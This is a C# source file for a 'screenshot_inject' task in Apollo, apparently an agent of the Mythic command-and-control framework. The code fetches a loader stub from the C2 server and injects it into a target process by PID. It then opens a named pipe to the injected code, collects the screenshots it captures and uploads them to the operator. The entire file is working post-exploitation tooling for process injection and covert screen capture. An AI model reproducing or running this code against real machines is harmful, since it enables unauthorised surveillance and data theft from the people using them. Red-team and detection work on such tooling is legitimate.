#define COMMAND_NAME_UPPER

#if DEBUG
#define SCREENSHOT_INJECT
#endif

#if SCREENSHOT_INJECT

using ApolloInterop.Classes;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class screenshot_inject : Tasking
    {
        [DataContract]
        internal struct ScreenshotInjectParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "count")]
            public int Count;
            [DataMember(Name = "interval")]
            public int Interval;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pid")]
            public int PID;
        }
        private ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
        private AutoResetEvent _pipeConnected = new AutoResetEvent(false);

        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;
        private Action<object> _putFilesAction;
        List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();

        private bool _completed = false;

        public screenshot_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _senderEvent,
                    _cancellationToken.Token.WaitHandle,
                    _complete
                    });
                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
                _completed = true;
                _complete.Set();
            };
            _putFilesAction = (object p) =>
            {
                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle, _complete };
                while (!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(waiters);
                    if (_putFilesQueue.TryDequeue(out byte[] screen))
                    {
                        ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
                        {
                            if (_agent.GetFileManager().PutFile(
                                _cancellationToken.Token,
                                _data.ID,
                                screen,
                                null,
                                out string mythicFileId,
                                true))
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    mythicFileId,
                                    false,
                                    ""));
                                return true;
                            } else
                            {
                                return false;
                            }
                        }, _cancellationToken.Token);
                        uploadTasks.Add(uploadTask);
                        uploadTask.Start();
                    }
                }
            };
        }



        public override void Start()
        {
            TaskResponse resp;
            try
            {
                ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    bool pidRunning = false;
                    try
                    {
                        System.Diagnostics.Process.GetProcessById(parameters.PID);
                        pidRunning = true;
                    }
                    catch
                    {
                        pidRunning = false;
                    }

                    if (pidRunning)
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] exeAsmPic))
                        {
                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
                            if (injector.Inject())
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    "",
                                    false,
                                    "",
                                    new IMythicMessage[]
                                    {
                                        Artifact.ProcessInject(parameters.PID,
                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                    }));
                                int count = 1;
                                int interval = 0;
                                if (parameters.Count > 0)
                                {
                                    count = parameters.Count;
                                }

                                if (parameters.Interval >= 0)
                                {
                                    interval = parameters.Interval;
                                }

                                IPCCommandArguments cmdargs = new IPCCommandArguments
                                {
                                    ByteData = new byte[0],
                                    StringData = string.Format("{0} {1}", count, interval)
                                };
                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                client.ConnectionEstablished += Client_ConnectionEstablished;
                                client.MessageReceived += OnAsyncMessageReceived;
                                client.Disconnect += Client_Disconnect;
                                if (client.Connect(10000))
                                {
                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                                    foreach (IPCChunkedData chunk in chunks)
                                    {
                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                    }

                                    _senderEvent.Set();
                                    WaitHandle[] waiters = new WaitHandle[]
                                    {
                                        _complete,
                                        _cancellationToken.Token.WaitHandle
                                    };
                                    WaitHandle.WaitAny(waiters);
                                    ST.Task.WaitAll(uploadTasks.ToArray());
                                    bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
                                    if (bRet)
                                    {
                                        resp = CreateTaskResponse("", true, "completed");
                                    }
                                    else
                                    {
                                        resp = CreateTaskResponse("", true, "error");
                                    }
                                }
                                else
                                {
                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse(
                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                true,
                                "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Process with ID {parameters.PID} is not running.",
                            true,
                            "error");
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _senderEvent.Set();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _cancellationToken.Token);
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
                {
                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
                }
            }
        }

        private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());

            if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
            {
                throw new Exception("Invalid type received from the named pipe!");
            }
            _putFilesQueue.Enqueue(((ScreenshotInformation)msg).Data);
            _putFilesEvent.Set();
        }
    }
}
#endif